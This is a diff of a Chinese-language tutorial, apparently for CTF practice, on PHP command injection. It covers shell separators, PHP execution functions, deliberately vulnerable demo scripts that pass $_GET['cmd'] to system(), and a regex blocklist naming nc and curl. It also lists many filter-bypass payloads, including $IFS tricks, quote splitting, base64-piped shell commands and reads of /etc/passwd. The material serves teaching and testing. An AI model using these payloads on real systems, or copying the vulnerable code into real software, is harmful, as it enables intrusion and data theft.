@@ -2,7 +2,7 @@
 
 允许攻击者向应用程序注入和执行系统命令。这种漏洞通常发生在应用程序未能正确验证或过滤用户输入，使得恶意输入能够直接传递给系统命令执行。
 
-RCE，即远程命令执行（Remote Command Execution）或远程代码执行（Remote Code Execution）。
+RCE（**R**emote **C**ommand **E**xecution 或 **R**emote **C**ode **E**xecution）即远程命令执行或远程代码执行。
 
 > 代码执行与命令执行的区别？
 
@@ -10,16 +10,16 @@ RCE，即远程命令执行（Remote Command Execution）或远程代码执行�
 
 ## 命令分隔符
 
-| 名称 | 例子           | 说明                                                                                                      |
-| ---- | -------------- | --------------------------------------------------------------------------------------------------------- |
-| ;    | `whoami;ls`    | 命令的结束符，允许一行多个命令从左到右顺序执行，所有命令都会执行。Windows 系统下命令提示符`cmd`无此语法。 |
-| &&   | `whoami&&ls`   | 逻辑与，只有第一条命令成功执行，才会执行第二条命令。                                                      |
-| \|\| | `whoami\|\|ls` | 逻辑或，只有第一条命令失败时，才会执行第二条命令。                                                        |
-| \|   |                | 管道符，两个命令都执行，第一条命令的输出作为第二条命令的输入，第一条命令的输出不显示。                    |
-| &    |                | 后台执行，两个命令同时执行。                                                                              |
-| %0A  |                | PHP 环境下使用。                                                                                          |
+| 名称 | 示例 | 说明|
+|---------|----------|---------|
+| `;`    | `whoami;ls` | 命令结束符，允许一行多条命令按顺序执行，所有命令均会运行。Windows 系统下命令提示符`cmd`不支持该语法。|
+| `\&\&` | `whoami&&ls` | 逻辑与，仅当第一条命令成功，才执行第二条命令。|
+| `\|\|` | `whoami\|\|ls` | 逻辑或，仅当第一条命令失败，才执行第二条命令。|
+| `\|`   |  | 管道符，两条命令都执行，第一条命令的输出作为第二条命令的输入，其中第一条命令的输出不显示。|
+| `\&`   |  | 后台执行，两个命令同时执行。|
+| `%0A`  |  | PHP 环境下使用。|
 
-输入输出重定向
+## 输入输出重定向
 
 `$(ls)`
 ls${}${IFS}id
@@ -60,23 +60,13 @@ if (!preg_match('/|dir|nl|nc||flag|sh|cut|awk||od|curl|ping|\*||ch|zip|mod|sl|fi
   }
 ```
 
-## PHP 的命令执行相关函数
+## PHP 命令执行相关函数
 
-| 函数名称                                                                   | 说明                                                                                |
-| -------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
-| [system()](https://www.php.net/manual/zh/function.system.php)              | 执行外部程序，成功则返回命令输出的最后一行，失败则返回 false。**显示输出**          |
-| [exec()](https://www.php.net/manual/zh/function.exec.php)                  | 执行一个外部程序，**返回**命令执行结果的最后一行内容                                |
-| [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)      | 通过 shell 执行命令并将完整的输出以字符串的方式**返回**                             |
-| ``[反引号](https://www.php.net/manual/zh/language.operators.execution.php) | 将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，与函数 shell_exec() 相同 |
-| [passthru()](https://www.php.net/manual/zh/function.passthru.php)          | 执行外部程序并且**显示原始输出**                                                    |
-| [pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)        | 在当前进程空间执行指定程序                                                          |
-| popen()                                                                    |                                                                                     |
-| [proc_open()](https://www.php.net/manual/zh/function.proc-open.php)        | 执行一个命令，并且打开用来输入/输出的文件指针。                                     |
-| pcntl_exec()                                                               |                                                                                     |
+system()、exec() 和 shell_exec() 等函数均通过调用 `/bin/sh -c` 来执行传入的命令字符串。
 
-- [system()](https://www.php.net/manual/zh/function.system.php) 执行外部程序，并且显示输出
+### [system()](https://www.php.net/manual/zh/function.system.php)
 
-成功则返回命令输出的最后一行，失败则返回`false`;并且**显示输出**。
+执行命令，并且**显示输出**。成功则返回命令输出的最后一行，失败则返回`false`。
 
 ```php
 <?php
@@ -85,22 +75,26 @@ echo system('whoami');
 /*
  * root
  * root
- * 会输出两个结果，注意，第二个输出为返回值，仅为最后一行
+ * 会输出两个结果，注意，第二个为仅包含最后一行的返回值。
  */
 ```
 
-- [exec()](https://www.php.net/manual/zh/function.exec.php)
+### [exec()](https://www.php.net/manual/zh/function.exec.php)
 
-执行一个外部程序，**返回**命令执行结果的最后一行内容
+执行命令，**返回**命令输出的最后一行内容。
 
 ```php
+<?php
 exec('whoami'); // 无任何输出
 var_dump(exec('whoami'));  // string(4) "root"，输出最后一行内容
 ```
 
-- [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php) 通过 shell 执行命令并将**完整的输出以字符串的方式返回**
+### [shell_exec()](https://www.php.net/manual/zh/function.shell-exec.php)
+
+通过 shell 执行命令并将**完整的输出以字符串的方式返回**
 
 ```php
+<?php
 shell_exec('whoami'); // 无任何输出
 var_dump(shell_exec('whoami'));
 /*
@@ -110,11 +104,12 @@ var_dump(shell_exec('whoami'));
  */
 ```
 
-- ``[反引号](https://www.php.net/manual/zh/language.operators.execution.php)
+### [反引号（``）](https://www.php.net/manual/zh/language.operators.execution.php)
 
-执行运算符，将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，**与函数 shell_exec() 相同**
+执行运算符，将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，**与函数 shell_exec() 相同。**
 
 ```php
+<?php
 `whoami`; // 无任何输出
 var_dump(`whoami`);
 /*
@@ -124,11 +119,14 @@ var_dump(`whoami`);
  */
 ```
 
-- [passthru()](https://www.php.net/manual/zh/function.passthru.php) 执行外部程序并且显示**原始**输出
+### [passthru()](https://www.php.net/manual/zh/function.passthru.php)
+
+执行外部程序并且显示**原始**输出
 
 成功时返回 null， 或者在失败时返回 false。
 
 ```php
+<?php
 passthru('whoami'); // root
 var_dump(passthru('whoami'));
 /*
@@ -137,15 +135,22 @@ var_dump(passthru('whoami'));
  */
 ```
 
-- [pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php) 在当前进程空间执行指定程序
+### [pcntl_exec](https://www.php.net/manual/zh/function.pcntl-exec.php)
+
+在当前进程空间执行指定程序
 
 ```php
 pcntl_exec("/bin/bash",array($_POST["cmd"]));
 pcntl_exec("/bin/bash",array('whoami'));
 ```
 
-- [popen](https://www.php.net/manual/zh/function.popen.php) 打开进程文件指针
-- [proc_open()](https://www.php.net/manual/zh/function.proc-open.php) 执行一个命令，并且打开用来输入/输出的文件指针。
+### [popen](https://www.php.net/manual/zh/function.popen.php)
+
+打开进程文件指针
+
+### [proc_open()](https://www.php.net/manual/zh/function.proc-open.php)
+
+执行一个命令，并且打开用来输入/输出的文件指针
 
 ```php
 <?php
@@ -209,9 +214,17 @@ echo proc_open('whoami', $descriptorspec, $pipes);
 <?php
 highlight_file(__FILE__);
 
-$cmd = str_replace(" ", "", $_GET['cmd'];
-echo "CMD: " . $cmd . PHP_EOL;
-exec($cmd);
+// 获取用户输入的命令
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : die("No command provided");
+
+// 过滤用户输入的命令：移除空格
+$cmd = str_replace(" ", "", $cmd);
+
+// 输出用户输入的命令（转义以防止 XSS）
+echo "CMD: " . htmlspecialchars($cmd) . "<br>";
+
+// 执行命令
+system($cmd);
 ```
 
 - `$IFS`、`${IFS}`、`$IFS$9`
@@ -265,34 +278,50 @@ x=$'cat\t/etc/passwd';$x
 
 ### 绕过黑名单
 
-- 单引号
+```php
+<?php
+highlight_file(__FILE__);
 
-```bash
+// 获取用户输入的命令
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : die("No command provided");
+
+// 检查用户输入的命令是否包含黑名单中的命令
+$blacklist = ['ls', 'cat', 'flag'];
+foreach ($blacklist as $value) {
+    if (stripos($cmd, $value) !== false) {
+        die("HACKER!");
+    }
+}
+
+// 输出用户输入的命令（转义以防止 XSS）
+echo "CMD: " . htmlspecialchars($cmd) . "<br>";
+
+// 执行命令
+system($cmd);
+```
+
+- 引号（单引号、双引号、反引号）
+
+```sh
+# 单引号
 w'h'o'am'i
 wh''oami
-```
 
-- 双引号
-
-```bash
+# 双引号
 w"h"o"am"i
 wh""oami
-```
 
-- 反引号\`
-
-```bash
+# 反引号\`
 wh``oami
 ```
 
 - 反斜线`\`（转义字符）
 
-```bash
+```sh
 wh\oami
-
 ```
 
-转义字符可以和换行符连用，实现命令续行，URL 编码的示例如下：
+转义字符（%5C）和换行符（%0A）连用，实现命令续行，以下是经 URL 编码示例：
 
 ```
 ca%5C%0At%20/et%5C%0Ac/pa%5C%0Asswd
@@ -300,31 +329,12 @@ ca%5C%0At%20/et%5C%0Ac/pa%5C%0Asswd
 
 - 变量
 
-```bash
+```sh
 # 变量拼接
 a=f;b=lag;cat $a$b # cat flag
 
 # 未初始化的变量，等价于null
 ca${u}t f${u}lag
-```
-
-- 编码转换
-
-```bash
-# base64
-echo "d2hvYW1pCg=="|base64 -d|sh # whoami
-echo "d2hvYW1pCg=="|base64 -d|$0 # whoami
-bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
-
-# 逆序
-$(rev<<<'imaohw') # whoami
-
-# 大小写
-$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
-$(a="WhOaMi";printf %s "${a,,}")
-
-# 十六进制
-
 ```
 
 - 模式扩展
@@ -344,9 +354,27 @@ cat [f]lag
 cat {f,}lag
 
 # 子命令扩展
-
 cat /fla$(u)g
 cat /fla`u`g
+```
+
+- 编码转换
+
+```bash
+# base64
+echo "d2hvYW1pCg=="|base64 -d|sh # whoami
+echo "d2hvYW1pCg=="|base64 -d|$0 # whoami
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
+
+# 逆序,bash
+$(rev<<<'imaohw') # whoami
+
+# 大小写
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+
+# 十六进制
+
 ```
 
 - 位置参数的特殊变量`$@`和`$*`
@@ -370,7 +398,7 @@ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 # ${varname:offset:length} 子字符串
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 
-# d
+# 字符替换
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
 
@@ -382,9 +410,9 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 
 ### 绕过长度限制
 
-#### 15位
+#### 15 位
 
-#### 命令执行5位 （HITCON 2017 Quals Babyfirst Revenge）
+#### 命令执行 5 位 （HITCON 2017 Quals Babyfirst Revenge）
 
 ```php
 <?php
